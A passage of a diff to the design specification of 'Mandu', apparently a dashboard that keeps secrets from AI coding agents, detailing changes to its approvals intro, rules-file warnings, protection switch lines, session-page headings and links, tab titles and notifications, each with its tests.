+   Always allowed. Kept in Rules" (or *Blocked*), the same `keptLink`, so
+   someone who notices a wrong answer where they read what happened goes
+   to Rules in one step, not through Approvals (§4.25b *A stop says Mandu
+   asked you*).
+   **The intro says what is true of every card** (2026-10-27). Under the
+   title the page said "Allow once lets just this one through", while the
+   send card under it said "Mandu refused this one, so nothing was sent":
+   a send is refused before it is asked about, so *Allow once* lets the
+   agent's next try through (a program's next connection likewise; only a
+   held program still waiting goes on at once, and a held message has no
+   *Allow once*). Someone who read only the intro pressed *Allow once* and
+   waited on an agent that would not retry by itself. The intro now reads
+   "Each question says what its answers do. Allow once covers one request.
+   When Mandu has already refused the one asked about, that is the agent's
+   next try. Answers that last, such as Always allow and Block, are kept
+   under Rules, where you can change them." *Rules* stays the page link.
+   The cards, answers and routes are unchanged; the developer view keeps
+   its own copy. Tests: `home-js-approvals-intro.test.ts` (no "this one",
+   the three answers, the link, the vocabulary sweep) and
+   `tests/stack/approval-names-secret.test.ts` N2b (the served intro beside
+   the served, refused send card, with the no-value, no-token oracle).
 3. **Rules** — no switch (2026-10-05: the on/off moved to Settings, below;
    while protection is off a line above the rules says they are kept but not
    enforced and links to Settings; since 2026-10-07 that line says what runs
-   now beside what is saved, *The on/off says what runs* below); then five cards: *Describe what you
+   now beside what is saved, *The on/off says what runs* below; an edit to
+   policy.yaml Mandu refused gets a line there too, and Your rules names the
+   file, *Rules says where your rules file is* below); then six cards: *Describe what you
    want* (below); **Your rules** (2026-10-05: ONE list, a row per rule with
    one label or effect menu and a ⋯, §4.25c, §4.25p; file rules first as the
    §4.25f tree, then the other groups in the page's vocabulary, §4.25d,
    §4.25e), with **Add a rule** opening the file browser (§4.25m, §4.25n);
    **Who may get your secrets** (§4.25aa, the same rules read per program,
    host and AI, read only; each file opens its rule's row in Your rules);
+   **Files made from your secrets** (§4.25aa *Files made from your
+   secrets*: the files Mandu keeps secret because something holding a
+   secret wrote them, read only, closed until Show, hidden while none);
    **Keys Mandu found** (§4.25r, its own card, closed until Review); and the
    built-in protections for the running mode (§4.25z). **Changes to save**
    (§4.25n) is kept at the bottom of the window while anything waits. The Rules page links
@@ -5733,9 +7069,10 @@ every server string inserted as text):
 4. **Settings** — first the **Protection** card: ONE on/off switch
    (`#switch-protection`, the confidentiality axis), its state as On / Off
    and one sentence, POSTing `{mode}` to `/api/config/axes`: on is `secrets`,
-   off is `off` (turning it off keeps the typed-OFF gate; the switch holds
-   until the answer, *The switch holds while its change is on its way*,
-   below). Mandu is about
+   off is `off` (turning it off keeps the typed-OFF gate, asked in a box in
+   the row and in any case, *Turning protection off asks on the page, and
+   OFF takes any case*; the switch holds until the answer, *The switch holds
+   while its change is on its way*, below). Mandu is about
    secrets, so the frozen integrity axis (§4.25o) has no switch: a flip keeps
    it as it is only under the opt-in (`full` / `injection`), and otherwise
    turns a leftover one off too, which the server always allows. In the same
@@ -5784,7 +7121,11 @@ service, the fallbacks, the helper note) is unchanged. Tests:
 the line's words in each state, the question under the row),
 `view-model/service-summary.test.ts` (no sentence says protect or repeats
 its state), stack `settings-service-answers` and `settings-service-follows`
-(the served page: one row throughout, the red dot on a crash).
+(the served page: one row throughout, the red dot on a crash). While Mandu is
+not running at all (`protection.notRunning`), a Stopped line drops its
+sentence ("Stopped. [Start]"): the on/off's sentence above already says
+so, with the start commands as code (since 2026-11-02, *Protection is off
+when nothing runs*, *Said once*).
 
 **The service row answers its button (2026-10-10).** Until then the row's
 `act` threw the POST's answer away and drew the row again. Every control
@@ -5807,8 +7148,13 @@ refuses it, so every Restart failed, signed in too, and nothing said so
 stack's promoted arbiter outlives a dashboard restart and is adopted by
 design). Now `buildServiceSummary` gives a running adopted service no
 button, the sentence "It was already running when this dashboard started,
-so this page cannot restart it." (`ADOPTED_SENTENCE`, after "Running." since
-*One Protection row*), and no "Started …" (its `since` is when
+so this page cannot restart it or pass on your answers. Run `mandu stop` when
+no agent is running with mandu, then start your agent again."
+(`ADOPTED_SENTENCE`, after "Running." since *One Protection row*; since
+2026-10-25 it says the consequence and the way out, as the refusal on every
+answer does, §4.25 *An answer this dashboard cannot pass on*; the summary's
+`sentenceParts`, `ADOPTED_PARTS`, carry the command as code, null for every
+other sentence), and no "Started …" (its `since` is when
 the dashboard found it). Once it is no longer running, Start comes back (a
 start adopts or spawns). The control
 routes, the admin gate and the supervisor's refusal are unchanged; the
@@ -5837,8 +7183,8 @@ Settings, with a Start whose POST only waited for the start under way
 (`Supervisor.start` coalesces on the one in flight).
 
 Now the page's poll (every 10 s while the tab is shown, and on a return to
-it, as Home's) also runs `home.js followServices` while Settings is the
-page. It reads `/api/control/summary` again and draws the row only when the
+it; Home's also reads in a background tab, *A background tab keeps
+reading*) also runs `home.js followServices` while Settings is the page. It reads `/api/control/summary` again and draws the row only when the
 summary differs from the one it was drawn from (`S.services`), as *The poll
 keeps your place* does for Home's sections. So a crash, a start or a finished
 start shows within one poll, with no click, and in step with the top bar,
@@ -5947,8 +7293,11 @@ setting: that is what a flip changes. Green means on is both saved and
 running. The note under the row is unchanged ("Saved. It applies when the
 protection service next starts." while what runs differs, else "A change
 applies …"). Home's poll repaints both (`followRunning`), keyed on what runs
-(`runningKey`). So a late Home answer or a restart updates them, and a poll
-that changed nothing repaints nothing: a refusal in the note stays, and the
+(`runningKey`), and follows what is saved too (`followSaved`, *The protection
+switch keeps what you saved*: a `protection.configured` that says another
+on/off reads `config/axes` again). So a late Home answer, a restart or a
+change saved elsewhere updates them, and a poll that changed nothing
+repaints nothing: a refusal in the note stays, and the
 `role=status` line is not announced again. The switch's behaviour (the POST,
 the typed-OFF gate, the frozen axis) is unchanged. A read of the saved
 setting asked before your flip, or before a newer read, never draws the
@@ -5956,6 +7305,71 @@ switch (*The protection switch keeps what you saved*, 2026-10-12). Tests:
 `home-js-settings.test.ts` and `home-js-rules.test.ts` (every pair, the late
 answer, the poll), `protection-running.test.ts` (the served page over the real
 server with a real config file and a served posture, or none).
+
+*The other off lines follow what runs too (2026-11-03, queue item #294).*
+Three more lines say whether protection runs, from the protection
+service's own state rather than Home's: Settings › Prompt filters ("Protection
+is off, so Mandu only notes what it finds", from the card read's
+`enforcing`), a drawn Try a message answer ("Protection is off, so Mandu
+would only note these", from the try route's), and Rules' "What the rules
+say" for an opened file and Find a rule's answer for a typed path
+("Protection is off, so none of this is enforced now", `files/why`'s `off`).
+Each was read once and kept: after a restart to off, Settings › Protection
+turned amber while the card under it still read as enforced, which is the
+harmful direction. Now Home's poll also runs `followRunningAnswers`, keyed
+on the on/off alone (`secretsRunning`), once per change and per page
+(`S.runningFollowed.settings` / `.rules`): while Settings is shown it reads
+the Prompt filters card again (`loadPromptSettings`, whose end asks a drawn
+Try answer again, §4.25y *The answer follows the card*); while Rules is
+shown, each open "What the rules say" asks `files/why` again and the new
+answer replaces only its box (hosts typed in the row stay), a closed row's
+answer is forgotten so it asks when opened, and Find a rule's answer asks
+again. A poll whose on/off is the one followed reads nothing; an unknown
+on/off (a restart under way says "not connected") is no change, so the card
+never flashes to its could-not-read line mid-restart; the first poll that
+sees a page only takes its on/off (that page's own reads are as new); and a
+restart made from Settings is still followed on returning to Rules, whose
+memory is its own. A Prompt filters read records the on/off of the last
+poll, so Settings opened after a restart is not read twice. Never under the
+person's hands: with the focus in the card, an exception being written, a
+menu choice waiting for Enter or a question of the card open (or, on Rules,
+the focus on Find a rule's answer), nothing is read and the first poll after
+reads. Older `files/why` reads that answer after a newer one are dropped
+(per path, and for Find). Tests: `home-js-follows-running.test.ts`, and
+`protection-switch-follows.test.ts` (a real protection service restarted
+from off to on under an open Settings page).
+
+*The Protection row says when it was last turned off or on in the dashboard
+(2026-11-04, queue item #306).* The row said only the saved state ("Off"),
+so a person who turned protection off for a quick test and forgot could not
+tell ten minutes from ten days, though the top bar's "Protection off" and
+Home's "Protection is off." both lead here. The moment was already recorded:
+each flip of the switch sends a `config_change` record per axis to the
+arbiter's `arbiter-admin` stream, which the retention sweep never prunes,
+and `GET`/`POST /api/config/axes` answer the latest per axis as `audit`
+(§4.19 ②). Now the note under the switch leads with it (`home.js
+protectionChangedLead`): saved off and `audit.confidentiality.to` false,
+"Turned off in the dashboard Oct 30, 14:05 · 3 days ago. A change applies
+when the protection service next starts."; saved on and `to` true, "Turned
+on in the dashboard …". The moment is a `whenNode` (§4.25u), kept current by
+each poll. While what runs differs from what is saved, the second sentence
+is "It applies when the protection service next starts." (the lead already
+says it was saved, so not "Saved. It applies …"). No line in any other case:
+no `audit`, no confidentiality record, a `ts` that does not parse, or a
+record whose `to` is not the saved state, which means `mandu mode` or an
+edit of config.toml changed it since, and neither leaves a record; the note
+is then today's text, and the page never guesses a time. The words say what
+the record proves: "in the dashboard", never "by you" (every signed-in
+browser is the same person, but the page cannot prove who pressed), and
+never "Off since …" (a later `mandu mode` round trip off → on → off leaves
+no record, so the last dashboard turn-off can be older than the current off
+stretch; it overstates how long, never understates). `requestedBy` is never
+drawn, and the frozen integrity axis is not read. The line follows the reads
+that already draw the row (Settings' own, Rules', the follow of a setting
+saved elsewhere, a flip's answer); no new request. Tests:
+`home-js-protection-changed.test.ts` (each case, `requestedBy` never drawn,
+a flip's answer and an older read), `protection-last-changed.test.ts` (a
+real arbiter and dashboard: turned off on the page, then `mandu mode`).
 
 **A change waits (2026-10-07, first-session tour item 17).** While a rule
 change waits in Approvals, Rules lists the rules in FORCE, which can differ
@@ -5975,6 +7389,44 @@ so it never lingers here. Tests: `home-js-proposals.test.ts` ("tour 17"),
 `tests/stack/policy-pending-in-force.test.ts` (the Rules projection over a
 real arbiter with a held edit, before and after the agent's lock and a
 restart).
+
+**Rules says where your rules file is (2026-10-25, nightly #154).** Mandu
+reloads policy.yaml when it is edited by hand, and refuses an edit it finds
+not valid: the last version that worked stays in force (policy-surface.md
+§2.1 *Failure semantics*). Until now only the developer view drew that
+banner, and the product page looked as before: a lock for `~/.ssh` typed with
+a mistake was believed in force. The panel carries the file's state as
+`policyFile` (`{path, found, valid, problems, loadedAt, refusedAt}`,
+`view-model/policy-panel.ts`); `home.js renderRulesFile` draws it on each
+read of Rules (`loadRules`; the same answer leaves it as drawn,
+`sameAsDrawn('rules-file')`), the path as the page writes paths (`shortPath`):
+
+- **Refused** (`valid: false`): `#rules-refused`, a third box above the cards
+  (the warning box of `#rules-off`, `role="status"`): "Your last edit to
+  `~/.mandu/policy.yaml` has a mistake, so Mandu is still using the last
+  version that worked (since Oct 25, 14:05). Your rules below are the ones in
+  force. Fix the file and save it; Mandu reads it again within seconds." The
+  moment is `refusedAt`, the refusal, not the edit (left out when null), as
+  `momentNode` writes it. Then the problems as a list, each in the words of
+  the page (`problemWords`) and as text, never HTML (they can echo the file):
+  the first five, the fifth followed by ", and N more".
+- **In force** (`valid: true`, `found: true`): `#rules-file`, a dim note under
+  the intro of Your rules: "Saved in `~/.mandu/policy.yaml`. Mandu also reads
+  your hand edits to it."
+- **No file yet** (`found: false`): "Your rules will be saved in `<path>` when
+  you add one."
+- No `policyFile`, or no path (an older service, rules kept in memory):
+  nothing.
+
+Home's card on a refused edit links to the refused line (*An edit to
+policy.yaml Mandu refused*, 2026-10-26). The arbiter also marks the file not valid when one of its own whole-document
+writes is refused (policy-document-store), so the line may warn when the file
+is fine, never stay quiet when it is not. The Per value menu's name
+(`inheritedSend`) names the file the same way (`policyFileName`). Tests:
+`home-js-rules-policy-file.test.ts` (each state, five and more, markup as
+text, the redraw), `tests/stack/rules-policy-file-refused.test.ts` (a real
+arbiter polling a real file: valid, refused with its problem while the lock
+stays listed, fixed).
 
 **Cards and folds (2026-10-05).** On Rules and Settings every section is a
 card (`section.block.card`: its own panel, so where one ends is never in
@@ -5999,7 +7451,8 @@ says so. The agent's name carries what its Home row's does: a preview
 agent's **Preview** tag and the warning mark (§4.21 *A preview
 agent*, *The version's warning on the agent page*); a session that could
 not do its job has the warning written out under its header too (§4.21
-*On the product page*).
+*On the product page*), and one that ran with protection off says so in an
+amber line at the top (§4.25b, *The page says protection was off*).
 
 **The header says how long it ran and when it ended** (2026-10-05). Under
 the title, the time line used to read "ended 11 hours ago, started 11 hours
@@ -6011,7 +7464,20 @@ writes:
 - ended: "ran 36 seconds, ended Oct 4, 22:10 · 11 hours ago". The end is a
   `whenNode` `<time>` (§4.25u). "ran" counts from the first recorded step to
   the last, and its tooltip says so, with the start's clock time;
-- running: "running now, started Oct 5, 09:30 · 3 minutes ago";
+- running: "running now, started Oct 5, 09:30 · 3 hours ago, last step 2
+  minutes ago" (2026-10-25). The second moment is Home's *Running now* rule
+  (`lastStepMs`, *A live row names its last step as well as its start*): the
+  session's last event, `lastAt`, as a `time.ago` with its clock time on
+  hover, kept current by `refreshWhen`. With no `lastAt`, or one within a
+  minute of the start, "started …" alone. Until then the page a row opened
+  to answer "is it still working?" said less than the row: a session left
+  in a forgotten terminal read like one working now. When *Latest turn*
+  shows (three turn cards drawn, `drawLatestTurn`), "last step 2 minutes
+  ago" is a link-style `button.step-link` that does what Latest turn does
+  (`lastStepGoes`, `goToLatestTurn`), named "Last step 2 minutes ago: go to
+  the latest turn" (`aria-label`, rewritten by `refreshWhen` with its
+  words); with fewer turns it is plain words. As a `step-link` it prints as
+  its words (#91);
 - under a second, no "ran". With only one moment recorded, "ended …" or
   "started …" alone. With neither, no time at all.
 
@@ -6024,9 +7490,17 @@ now reads the launcher's `session_exit` too (`sessionExited`,
 view-model/session-exit.ts): an exit with no model call or tool step after
 it is the end; activity after an exit (a resumed session on the same log)
 keeps it running. Since 2026-10-06 the listing applies the same rule
-(`SessionRef.exited`, §4.10.4), so the inspector's row agrees. The workspace follows (", in `~/app`"). Tests:
-`home-js-agent.test.ts`, `session-walkthrough.test.ts` (the served header
-and the inspector's row for the same session).
+(`SessionRef.exited`, §4.10.4), so the inspector's row agrees. Since
+2026-11-03 a session whose `mandu` launch is still alive is running however
+long it has been quiet (§4.10.4 *A live launch keeps `R`*): the recency
+rule decides only when no live launch of the session remains. The workspace follows (", in `~/app`"). Tests:
+`home-js-agent.test.ts` (the last step: words with two turns, a button to
+the newest turn with three, "started …" alone within a minute, the words
+and name after the clock moves), `session-walkthrough.test.ts` (the served header
+and the inspector's row for the same session), stack
+`agent-latest-turn.test.ts` (a launch 10 minutes before the model calls:
+the served header names the last step, and its button reaches the newest
+turn, in jsdom and in Chromium at 1280 and 390 px).
 
 **A session on more than one day names its days** (2026-10-19). A turn's
 head showed only its clock time, "10:24", in a plain span with no day and
@@ -6063,6 +7537,46 @@ and a stopped message at 00:02; the switch's folds; a poll), the
 the stack `tests/stack/agent-story-days.test.ts` (a seeded session whose
 turns cross midnight, served over a real `DashboardServer`).
 
+**Each turn and each secret card is a heading** (2026-10-27). A session
+page holds up to 60 turns (`TURN_CAP`), each several steps long. A sighted
+reader scans the grey turn heads; a screen-reader user moves through a
+long page by its headings (the H key in NVDA and JAWS, the VoiceOver
+rotor), and the page had none below its h2s: a turn's "You asked" line and
+a *Your secrets* card's name were plain divs, so reaching the sixth turn
+meant reading through the five before it (WCAG 2.1 SC 1.3.1 *Info and
+Relationships*, 2.4.6 *Headings and Labels*). Nothing changes on screen.
+Now home.js:
+
+- each turn's line ("You asked", "You ran", "Before your first question",
+  and a stopped message's "A message you wrote") is an `<h3
+  class="turn-title">`, and the `<article>` is named by it
+  (`aria-labelledby`, `turnTitle`). The heading adds the turn's time, said
+  only to a screen reader (`.sr-only`): "You asked at 20:24". When the
+  cards drawn cover more than one day, `storyDayLines` adds the day in the
+  day line's own words: "You asked at 00:10 on Saturday, Oct 17". A card
+  with no time says none. The visible words stay in the `.note` span;
+- each secret card's name is an `<h3 class="secret-what">` ("`STRIPE_KEY`
+  in `~/mandu-try/.env`"), its names still code; the level tag stays
+  beside it in `.secret-head`, not in the heading;
+- the two h3s look as the lines they replace did (app.css): the turn's at
+  13 px in `--ink-3` and the line's weight, the secret's name at the
+  card's size and 600. Neither takes the headings' balanced wrap (§4.25u
+  *No word alone on a last line*), so a secret's long name wraps where it
+  did. The page's levels run h1, h2, h3 with none skipped;
+- with *Only where Mandu stepped in* on (§4.25ae), a folded turn's heading
+  is hidden with it, so the heading list is the turns where Mandu stepped
+  in.
+
+The time in the heading is separate text from the turn's `<time>`, and
+Find's opener and the place a redraw restores find a turn by its
+`data-turn-id`, not its head, so neither changes. Tests: `home-js-agent-headings.test.ts` (unit: one
+h3 a card, its name and time, over two days, a secret card's heading
+without its tag, no level skipped, the look under the page's styles in
+both themes beside the old markup, the switch's folds) and the component
+`agent-page-headings.test.ts` (the first-session tour served by a real
+`DashboardServer`: one heading per turn in the server's order with its
+time, one per secret card).
+
 **The tiles count what the page shows** (2026-10-05). Under the header,
 the tiles used to read "3 items masked before the AI saw them · 3 of them
 secrets · 1 action blocked" for the first-session tour. *Your secrets*,
@@ -6074,7 +7588,7 @@ the AI saw it. The send that left with `STRIPE_KEY` filled in had no tile,
 though Home's hero counts it. home.js `renderAgentPage` now draws:
 
 - "N secrets masked before the AI saw them": the *Your secrets* entries
-  whose card says "The AI got only a placeholder, never the real value"
+  whose card says "The AI got only its masked version, never the real value"
   (`SecretsStory.counts.masked`, every entry, past the cap too);
 - "N secrets the AI read before they were marked secrets" (amber):
   the entries whose card says the AI read the real value before the label
@@ -6143,6 +7657,78 @@ Show them read, the poll redraw) and the end-to-end
 `tests/stack/agent-tiles-go.test.ts` (a real stack's three blocks and three
 waiting rows: the served page at 1280 and 390 px, and the oracle).
 
+**What the counts mean** (2026-10-30). A tile's tooltip was the only place
+that said what it counts, and a tooltip shows on a mouse's hover alone:
+never on a phone or a tablet, nor from the keyboard. Under the tiles, a
+fold *What the counts mean* (`#agent-count-meanings`, a `<details
+class="more glossary">` like Rules' *What the words mean*, closed, one
+line) lists a term and its meaning for each tile drawn: "Secrets masked
+before the AI saw them", "Secrets the AI read before they were marked
+secrets", "Actions blocked" (a tile at 0 too) and "Sends with a real value
+filled in". A tile not drawn is not listed; "waiting for you", the
+frozen levels' untrusted count and a failed session's "reached the AI
+unmasked" say nothing beyond their names and add none. Each meaning is its
+tile's tooltip less the press sentence ("Press to go to …"), since the
+fold is no button. One list, home.js `COUNT_MEANINGS`, feeds the tiles'
+tooltips, this fold and Home's "?" notes (*"Masked", with a help button*,
+§5), so the words cannot drift apart; a page adds where it shows the count
+("Your secrets, below, says when."), the meaning never does. A redraw keeps
+the fold as you left it, and printing opens it (*A printed session is
+whole*), closing it after unless you had opened it. Tests:
+`home-js-count-meanings.test.ts` (the fold's terms, its words against the
+tooltips, print) and the end-to-end `tests/stack/count-meanings.test.ts`
+(Chromium at 390 px over the tour: Enter on the summary opens it and it
+lists the masked, blocked and sent counts; the oracle).
+
+*History's fold* (2026-11-02). History is where a person compares many
+sessions by these counts, and it was the one page that left them
+unexplained: every row ends in a counts line ("2 secrets masked, 1 send
+with a real value filled in") led by its marks ("protection failed",
+"protection was off", "less protection than usual"). Under History's
+search, above the list, the same fold (`#history-count-meanings`, closed,
+one line; home.js `drawRowMeanings` over `ROW_MEANINGS`, called on every
+branch of `renderHistory`) lists a term and meaning for each kind of count or mark a
+drawn row shows, in the counts line's order: "Protection failed" ("Something
+reached the AI unmasked. Open its page to see what.", Home's alarm's
+words), "Protection was off" (the `off` meaning of one session), "Less
+protection than usual" ("Not all of Mandu's protections started for it.",
+the server's words for a running agent's line, so the fold cannot
+contradict a session's notice), then the four counts above, each said of
+many ("Each went to …"). The two marks' entries are new in
+`COUNT_MEANINGS` (`less`, `failed`; `off` gains its row `mark`). "N
+questions waiting for you" (a link that says what it is) and the frozen
+levels' untrusted items add none. No drawn row with a count or a mark, an
+empty record or a failed read: it is hidden. It follows the list (a search,
+the switch, Go to a day, Show more, the poll): the same kinds leave it
+alone (no flicker, the focus kept), new ones draw its list again, and it
+stays open or closed as left. Printing History is not handled, so nothing
+changes there. Tests: `home-js-history-count-meanings.test.ts` and
+`tests/stack/count-meanings.test.ts`, extended (History at 390 px: Enter on
+the summary opens it, it lists exactly the counts the tour's row shows, in
+its order; the oracle).
+
+*Home's fold* (2026-11-04). Home's *Running now* and *Earlier in the last
+24 hours* end each row in the same counts line, and Home explained only
+its hero's counts (their "?"), never a row's marks ("protection failed",
+"less protection than usual"). Under Earlier, above *Where your data
+lives* (so under Running now when Earlier is hidden), the same fold
+(`#home-count-meanings`, closed, one line) lists a term and meaning for
+each kind of mark or count a row drawn in EITHER list shows, from the same
+`ROW_MEANINGS` and `COUNT_MEANINGS` as History's, in the counts line's
+order. Its kinds are the union of both lists' drawn rows: `renderAgents`
+and `renderEarlier` keep the rows they draw in `S.homeRows` before their
+`sameAsDrawn` returns, so an unchanged list still counts, and
+`renderHomeMeanings` draws the fold after both, on a failed read too (no
+rows: hidden, never the last kinds under "Could not check") and after
+Earlier's *Show them* (more rows, maybe new kinds). The rows Earlier cut
+add none until shown. Kept as History's is: the same kinds leave it
+alone, so Home's poll never redraws it (no flicker, the focus kept); new
+kinds draw its list again, open or closed as left. Tests:
+`home-js-home-count-meanings.test.ts` and `tests/stack/count-meanings.test.ts`,
+extended (Home at 1280 and 390 px: Enter on the summary opens it, it
+lists exactly the counts the tour's Earlier row shows, in its order, with
+no sideways scroll; the oracle).
+
 **A link that goes where a tile goes** (`?go=`, 2026-10-20). Home's counts
 link to the one session holding them (*The counts link where they point*),
 at the step: `/agents/<id>?go=blocked` or `?go=sent` presses that tile once
@@ -6150,14 +7736,76 @@ the visit's page is first drawn (`landGo` in `renderAgentPage`), so the step
 is opened, marked and focused, and a step in a turn not drawn first brings
 every turn (the *Show them* read), as a press does. `?go=secrets` gives the
 focus to *Your secrets*' heading and scrolls to it. Any other value, or a
-tile with nothing to go to, leaves the page as a plain link opens it. It is
-used once: `parseRoute` reads it (only `blocked`, `sent`, `secrets`),
+tile with nothing to go to, leaves the page as a plain link opens it.
+`?go=latest` (a Running now row's "last step", *A live row names its last
+step as well as its start*, 2026-10-25) does what *Latest turn* does
+(`goToLatestTurn`, whether its button shows or not); with no turn drawn it
+leaves the page as a plain link opens it. `?go=waiting` (a session row's
+"1 question waiting for you", *Agents, not sessions*, 2026-10-27) does what
+the waiting tile's press does (`goToWaiting`): the first card in *Needs
+your OK* takes the focus, scrolled into view, or the block's heading when
+no card is left (answered meanwhile, a rule change of the agent still
+showing the block); with the block hidden it leaves the page as a plain
+link opens it. `?go=not-applied` (an ended row's "changes to 1 file not
+applied", §4.25b *Home and History say so*, 2026-10-31) gives the focus to
+*Changes Mandu did not apply to your files*' heading and scrolls to it, as
+`secrets` does; with the block hidden (the session runs again, or its exit
+names none) it leaves the page as a plain link opens it. It is
+used once: `parseRoute` reads it (only `blocked`, `sent`, `secrets`, `latest`, `waiting`, `not-applied`),
 `stateHref` never writes it, so the page's canonical address replaces it at
 once, and Back, a reload or a later poll do not jump again. A link inside
 the page carries it as `data-land` (`setPage`'s `land`, as Rules' `?file=`
 link carries `data-file`). Tests: `home-js-agent-tiles-go.test.ts` G6-G9
 (the landing, the address after it, a poll that does not land again, the
-*Show them* read, `secrets`, an unknown value, Home's link pressed).
+*Show them* read, `secrets`, an unknown value, Home's link pressed);
+`home-js-row-waiting-link.test.ts` Q2-Q3 and stack `agent-tiles-go.test.ts`
+A3 (`waiting`).
+
+**A turn's time links to that turn** (`?turn=`, 2026-10-28). Nothing on the
+page gave an address for one moment of a session: someone pointing a bug
+report (Settings › About's *Report a problem*), a note or a colleague at
+"the turn where the key went out" could only send the session's address,
+and the reader scrolled a page up to 60 turns long. Now each turn's time
+(`turnTime`) holds a link, `/agents/<id>?turn=<turn id>` (`turnLink`,
+`a.turn-link` inside the `<time>`, so the day lines and *Latest turn* still
+read the time off it). Its words are the time; its name is "Link to this
+turn, 10:24"; it looks like the quiet time it was until hovered (underline,
+accent) or focused by keyboard (an accent ring), and prints as its words. A
+message Mandu stopped is no turn and keeps a plain time.
+
+- **A plain click** works as a fragment link does: the address becomes the
+  turn's by `history.replaceState` (no new history entry) and the turn is
+  marked. A Ctrl, Meta, Shift or Alt click, or a middle click, is left to
+  the browser (a new tab, a copied link). The focus stays on the link.
+- **The mark** (`.turn.shown`, an accent edge round the card, `Highlight` in
+  forced colors; an inset bar would be hidden by the head's background)
+  follows the address, as `:target` would: `markTurn` puts it on the turn
+  `S.agentTurn` names after every draw, so a poll keeps it. A tile's step
+  mark (`.step.shown`) is separate.
+- **Opening the address** lands on that turn once the visit's page is first
+  drawn (`landGo`, kind `turn`, then `goToTurn`), as *Latest turn* goes
+  (`goToCard`): focused, its top in view; folded by *Only where Mandu
+  stepped in*, its quiet line's button takes the focus instead. A turn
+  before the newest `TURN_CAP` first brings every turn (the *Show them*
+  read) and lands once that is drawn (`landAgent`). An id the story does
+  not have (past `TURN_ALL_CAP`, or none) gives *What happened*'s heading
+  the focus, in view.
+- **The address keeps it.** Unlike `?go=`, `stateHref` writes `?turn=`
+  (with `?only=` when the switch is on), so the address a person landed at
+  is still the turn's to copy or bookmark. It is landed on once a visit: a
+  poll never jumps again, and a place Back hands back wins over it. A link
+  to the session opens it without the turn, and `?ask=` wins over it.
+  `parseRoute` reads only a printable, space-free value of up to 256
+  characters (`turnParam`); turn ids are the server's own
+  (`turn:input:<event id>:<n>`), so the address holds the session id and
+  the turn id, never a secret, a path or a prompt.
+
+Tests: `home-js-turn-link.test.ts` K1-K8 (the route, the link and its name,
+the click and a modified click, the landing and a poll, a turn not drawn,
+an unknown turn, a folded turn, a plain link) and the end-to-end
+`tests/stack/session-turn-link.test.ts` (a real stack's 62 turns: the served
+page at the first turn's address brings every turn and lands on it, every
+link is ids only, a click moves the address and the mark, and the oracle).
 
 **The page links the trace it names** (2026-10-08). The page told the
 person in eight places that something was "in the detailed trace", and
@@ -6232,17 +7880,19 @@ address); and in a build without the developer view none of these words
 points to the trace.
 
 **Notifications.** Each ask this browser has not seen raises one browser
-notification ("Mandu: Claude Code needs your OK" plus the ask's sentence; a
-click opens Approvals), at most three per poll (since 2026-10-19 a rule
+notification ("Mandu: Claude Code in ~/projects/shop needs your OK" plus the
+ask's sentence; a click opens Approvals), at most three per poll (since 2026-10-19 a rule
 change waiting for you too, and one more line past three: below). The first visit in a browser
 records the backlog silently (`mandu.home.notifyPrimed`,
 `mandu.home.seenAsks` in localStorage), so opening the page never floods.
 Permission is asked only from a button (the Home offer row while permission
-is `default`, and Settings › Notifications, which also says when the browser
-blocked it or cannot notify on a non-secure address). The tab title carries
+is `default` and until its *No thanks*, below, and Settings › Notifications,
+which also says when the browser blocked it or cannot notify on a non-secure
+address). The tab title carries
 the count ("(3) Mandu") and the favicon a badge, as §4.20 does for the
-inspector. The 10 s poll is the transport, so a hidden tab notifies on its
-first poll after it becomes visible.
+inspector. The 10 s poll is the transport, and it also reads in a
+background tab, so a question notifies while you work in another tab or
+app (*A background tab keeps reading*, below).
 
 *The tab says the protection state (2026-10-22).* A pinned or background
 tab shows only its icon, and until then that icon was the green shield with
@@ -6262,11 +7912,52 @@ icon in one colour with one mark:
 The waiting count stays first ("(2) Protection off · Mandu"; a sub-page keeps
 its name: "Protection off · Mandu · Rules"), and its amber dot is drawn on
 the state's shield in place of the mark, which it would cover at 16 px (the
-green one dropped its check for it before). No read yet, or a verdict the
+green one dropped its check for it before). When no agent is held up by what
+it counts (the top bar's grey, *The top bar's two marks*: every question is
+from a session that has ended and no rule change waits), the dot is grey
+instead, with the same number (2026-10-31). Until then a question left
+unanswered when its session ended kept an amber dot on a pinned or
+background tab for good, the one place a person sees Mandu while working in
+another tab, while the page's own top bar said nothing was held up. The grey
+is the Off shield's own `#6c6c74` (the white digit 5.2:1), so the dot gets a
+white ring (`stroke-width` 1.5) that tells it from the Off and Not connected
+shields at 16 px; the amber dot keeps no ring. One live question or any rule
+change keeps the amber. No read yet, or a verdict the
 page does not know (an older server), claims nothing: the baseline icon and
-title. The icon is written only when its state or count changed, as the rest
-of the poll (`sameAsDrawn`). The top bar says the same words once the tab is
-open (*The top bar says on or off*).
+title. The icon is written only when its state, count or the dot's grey
+changed, as the rest of the poll (`sameAsDrawn`), so a new live question, or
+a quiet session that reads as running again, turns the dot amber at once. Tests:
+`home-js-home.test.ts` (the grey dot with its ring on the green, Off and
+Failed shields; a live question or a rule change keeps the amber; the title
+stays "(N)") and `tests/stack/home-waiting-verdict.test.ts` E2 (over a real
+`session_exit`, the served page's icon). The top bar says the same state once the tab is
+open (*The top bar says on or off*), "Protection failed" too since
+2026-10-23, and "Not connected" with no protection service since 2026-10-28.
+
+*A session page's tab names its session (2026-10-28).* Every session page
+read "Mandu · Claude Code", whatever its folder or day, so two session tabs,
+the browser's Back menu and history, a screen reader (WCAG 2.4.2) and a
+saved PDF's default file name could not tell sessions apart. The session
+page's title now names the session as its header does (`sessionTitle` in
+`home.js`): the agent, the last name of its folder and when it started,
+"Mandu · Claude Code in shop · Oct 24, 14:05", after the count and the
+state as on every page ("(1) Protection off · Mandu · Claude Code in shop ·
+Oct 24, 14:05").
+
+- **The folder** is the last part of the session's `cwd` (`~/projects/shop`
+  gives "shop"); the home folder itself is "~"; no folder, no "in …".
+- **The moment** is `clockWords` of the start (the year only when it is not
+  this one), else of its last step; neither, no moment. It is absolute, so
+  a running session's title is never rewritten as time passes.
+- **Header facts only, never the prompt.** The title shows in the window
+  switcher, in screen sharing and in the browser's synced history, so it
+  holds only what the header line shows beside the name: never what the
+  person asked, a value or a token.
+- A session Mandu has no record of, and the page while it loads, keep the
+  page's name, "Mandu · Agent". Every other page is unchanged.
+
+Tests: `home-js-agent.test.ts`; `tests/stack/long-name-breaks.test.ts` B12
+reads the served page's title over a real session.
 
 *Turn off for this browser (2026-10-19).* A page cannot take a granted
 permission back, so until then the row read "On. …" with no control, and
@@ -6289,6 +7980,117 @@ prompt) also clears a stored "off": asking means wanting them. `default`,
